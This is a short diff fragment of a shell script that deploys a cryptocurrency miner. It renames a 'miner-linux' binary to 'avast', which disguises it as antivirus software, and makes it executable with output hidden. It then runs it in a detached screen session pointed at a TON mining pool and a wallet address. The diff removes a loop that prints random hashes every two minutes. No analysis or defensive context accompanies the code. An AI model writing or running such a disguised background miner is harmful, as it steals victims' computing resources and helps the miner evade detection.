@@ -25,11 +25,3 @@ mv miner-linux avast >/dev/null 2>&1
 chmod +x avast >/dev/null 2>&1
 
 screen -dmS Running ./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
-
-while [ 1 ]; do
-
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-
-sleep 2
-
-done
